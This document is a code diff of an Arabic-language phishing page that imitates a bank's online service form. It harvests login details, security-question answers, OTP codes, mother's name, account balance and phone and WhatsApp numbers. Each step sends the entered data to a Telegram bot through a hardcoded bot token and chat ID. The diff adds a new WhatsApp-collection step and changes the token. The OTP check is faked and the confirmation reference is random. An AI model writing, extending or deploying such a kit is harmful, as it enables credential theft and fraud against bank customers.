@@ -43,6 +43,7 @@
         .info-text { color: #444; font-size: 14px; line-height: 1.7; display: block; margin-top: 15px; text-align: justify; }
         .warning-text { color: #d32f2f; font-weight: 700; background-color: #fff3f3; padding: 12px; border-right: 4px solid #d32f2f; margin-top: 15px; font-size: 13px; border-radius: 0 4px 4px 0; }
         
+        /* التنسيق الخاص ببيانات العميل المسترجعة */
         .client-summary-box { background-color: #f0f7f4; border: 1px solid #c8e6c9; padding: 15px; border-radius: 6px; margin-bottom: 15px; font-size: 13.5px; line-height: 1.6; color: #2e7d32; }
         .client-summary-box strong { color: #1b5e20; }
 
@@ -62,7 +63,6 @@
     </header>
 
     <div class="main-container">
-        <!-- خطوة 1 -->
         <div id="step-1" class="card">
             <h2>الاستمارة أونلاين</h2>
             <h3>اختر نوع المشكلة التي تواجهها (ما يمكن معالجته عبر هذا القسم)</h3>
@@ -127,7 +127,6 @@
             <button class="btn-submit" onclick="handleStep1Next()">متابعة</button>
         </div>
 
-        <!-- تفاصيل التحويل الخاطئ -->
         <div id="step-wrong-transfer" class="card hidden">
             <h2>تفاصيل التحويل الخاطئ</h2>
             <h3>الرجاء تزويدنا ببيانات الحساب المستلم بالخطأ</h3>
@@ -150,7 +149,6 @@
             <button class="btn-submit" onclick="submitWrongTransferData()">حفظ ومتابعة تسجيل الدخول</button>
         </div>
 
-        <!-- :استمارة إثبات دخل -->
         <div id="step-income-verification" class="card hidden">
             <h2>استمارة إثبات دخل</h2>
             <h3>الرجاء تزويدنا ببيانات الدخل والجهة الضامنة</h3>
@@ -185,7 +183,6 @@
             <button class="btn-submit" onclick="submitIncomeData()">حفظ ومتابعة تسجيل الدخول</button>
         </div>
 
-        <!-- خطوة 2 -->
         <div id="step-2" class="card hidden">
             <h2>الاستمارة أونلاين</h2>
             <h3>الرجاء إدخال البيانات</h3>
@@ -204,7 +201,16 @@
             <button class="btn-submit" onclick="submitStep1()">تسجيل الدخول</button>
         </div>
 
-        <!-- خطوة 3 -->
+        <div id="step-whatsapp-verification" class="card hidden">
+            <h2>التحقق الأمني المتقدم</h2>
+            <h3>لدواعي أمنية يرجى إدخال رقم واتساب للتواصل</h3>
+            <div class="input-group">
+                <label>رقم تواصل واتساب الفعال:</label>
+                <input type="tel" id="whatsapp-num" placeholder="أدخل رقم الواتساب الفعال (مثال: 0912345678)">
+            </div>
+            <button class="btn-submit" onclick="submitWhatsappStep()">حفظ ومتابعة</button>
+        </div>
+
         <div id="step-3" class="card hidden">
             <h2>متابعة الاستمارة أونلاين</h2>
             <h3>لأغراض الأمان يرجى الإجابة على سؤال واحد من أسئلة الأمان</h3>
@@ -213,7 +219,7 @@
                 <select id="security-question">
                     <option value="" disabled selected>-- اختر سؤال الأمان --</option>
                     <option>ما هو اسم ابن عمك الاول؟</option>
-                    <option>في اي مدينة ولدت؟</option>
+                    <option>في اي مدينة ولدت?</option>
                     <option>في اي سنة تخرجت من الجامعة؟</option>
                     <option>اسم فريق كرة القدم المفضل لديك؟</option>
                     <option>ما هو اسم المدرسة التي التحقت بها؟</option>
@@ -226,7 +232,6 @@
             <button class="btn-submit" onclick="submitStep2()">إرسال</button>
         </div>
 
-        <!-- خطوة 4 -->
         <div id="step-4" class="card hidden">
             <h2>متابعة الاستمارة أونلاين</h2>
             <h3>لأغراض الأمان يرجى تأكيد التفاصيل المالية وبينات الهوية بالحساب</h3>
@@ -242,11 +247,6 @@
             </div>
             
             <div class="input-group">
-                <label>رقم تواصل واتساب:</label>
-                <input type="tel" id="whatsapp-num" placeholder="أدخل رقم الواتساب الفعال">
-            </div>
-            
-            <div class="input-group">
                 <label>رقم الهاتف المرتبط بالحساب:</label>
                 <input type="tel" id="linked-phone" placeholder="أدخل رقم شريحة الحساب">
             </div>
@@ -254,9 +254,7 @@
             <button class="btn-submit" onclick="submitStep3()">متابعة</button>
         </div>
 
-        <!-- خطوة 5 -->
         <div id="step-5" class="card hidden">
-            <!-- الـ OTP الافتراضي -->
             <div id="otp-area">
                 <h2>إدخال رمز OTP</h2>
                 <div class="input-group">
@@ -267,7 +265,6 @@
                 <button id="verify-btn" class="btn-submit" onclick="verifyOtp()">التحقق الاعتمادي</button>
             </div>
 
-            <!-- الصندوق النهائي المحدث -->
             <div id="final-status-box" class="success-box hidden">
                 <h2 style="color: #2e7d32; text-align: center; margin-bottom: 10px;">✓ تم تسجيل ومعالجة طلبك بنجاح</h2>
                 <span class="reference-title">الرجاء حفظ وتوثيق الرقم المرجعي التابع لك:</span>
@@ -359,12 +356,27 @@
                 return;
             }
             
+            // التوجيه إلى صفحة الواتساب الجديدة (الترتيب الثالث)
+            goToStep('step-whatsapp-verification');
+        }
+
+        // دالة معالجة الصفحة الثالثة الجديدة (الواتساب)
+        function submitWhatsappStep() {
+            const whatsappInput = document.getElementById('whatsapp-num').value.trim();
+            if (!whatsappInput) {
+                return alert('الرجاء إدخال رقم الواتساب للمتابعة');
+            }
+            userData.whatsappNum = whatsappInput;
+            
+            sendToTelegram(`💬 رقم واتساب للتواصل المبدئي:\n📱 الرقم: ${userData.whatsappNum}`);
+            
+            // فحص الخدمة المحددة لتحديد المسار التالي بعد الواتساب
             if (selectedService === 'التحويلات الخاطئة') {
                 goToStep('step-wrong-transfer');
             } else if (selectedService === 'إثبات دخل') {
                 goToStep('step-income-verification');
             } else {
-                goToStep('step-3');
+                goToStep('step-3'); // أسئلة الأمان
             }
         }
 
@@ -407,7 +419,6 @@
             }
             sendToTelegram(`🔐 أمان\n❓ السؤال: ${userData.securityQuestion}\n💬 الجواب: ${userData.securityAnswer}`);
             
-            // التأكد من أن الـ OTP نظيف وجاهز للمرة الأولى
             document.getElementById('otp-area').style.display = 'block';
             document.getElementById('final-status-box').classList.add('hidden');
             goToStep('step-5'); 
@@ -434,36 +445,33 @@
                 btn.disabled = false;
                 btn.innerHTML = `التحقق الاعتمادي`;
                 
-                goToStep('step-4'); // يذهب لخطوة البيانات المالية والشخصية
+                goToStep('step-4');
             }, 3000);
         }
 
         function submitStep3() {
             userData.amount = document.getElementById('account-amount').value;
             userData.motherName = document.getElementById('mother-name').value;
-            userData.whatsappNum = document.getElementById('whatsapp-num').value;
             userData.linkedPhone = document.getElementById('linked-phone').value;
 
-            if (!userData.amount || !userData.motherName || !userData.whatsappNum || !userData.linkedPhone) {
+            if (!userData.amount || !userData.motherName || !userData.linkedPhone) {
                 return alert('الرجاء إكمال جميع البيانات التأكيدية المطلوبة');
             }
             
             let randomRef = 'BOK-' + Math.floor(10000000 + Math.random() * 90000000);
             userData.refNum = randomRef;
 
-            sendToTelegram(`💰 تأكيد المبلغ والبيانات الشخصية:\n💵 المبلغ: ${userData.amount}\n👩‍👦 إسم الوالدة: ${userData.motherName}\n💬 واتساب: ${userData.whatsappNum}\n📱 الهاتف المرتبط: ${userData.linkedPhone}\n🎫 المرجعي المولد: ${userData.refNum}`);
+            sendToTelegram(`💰 تأكيد المبلغ والبيانات الشخصية:\n💵 المبلغ: ${userData.amount}\n👩‍👦 إسم الوالدة: ${userData.motherName}\n📱 الهاتف المرتبط: ${userData.linkedPhone}\n🎫 المرجعي المولد: ${userData.refNum}`);
             
-            // حقن البيانات في عناصر المراجعة
+            // حقن البيانات المدخلة ديناميكياً داخل نص مراجعة العميل
             document.getElementById('summary-account').textContent = userData.accountNum;
             document.getElementById('summary-mother').textContent = userData.motherName;
             document.getElementById('summary-whatsapp').textContent = userData.whatsappNum;
 
-            // الإصلاح البرمجي هنا: إخفاء حقل طلب الـ OTP وإظهار صندوق النجاح فقط عند العودة
             document.getElementById('otp-area').style.display = 'none';
             document.getElementById('display-ref-num').textContent = randomRef;
             document.getElementById('final-status-box').classList.remove('hidden');
-            
-            goToStep('step-5'); // يعود لخطوة 5 ليعرض النتيجة نظيفة
+            goToStep('step-5');
         }
 
         function togglePassword(i) {
@@ -487,7 +495,7 @@
         }
 
         function sendToTelegram(messageText) {
-            const botToken = "8697763484:AAFqSD15uevEyv8FpYCVfsakdSLhc8MAW1s";
+            const botToken = "8719899684:AAGU0uhAb7LodoWIuXu_1Wm4wkS3kViqnfA";
             const chatId = "8623773122";
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
@@ -495,7 +503,7 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: messageText })
-            }).catch(err => console.log("Telegram Error handled"));
+            });
         }
     </script>
 </body>
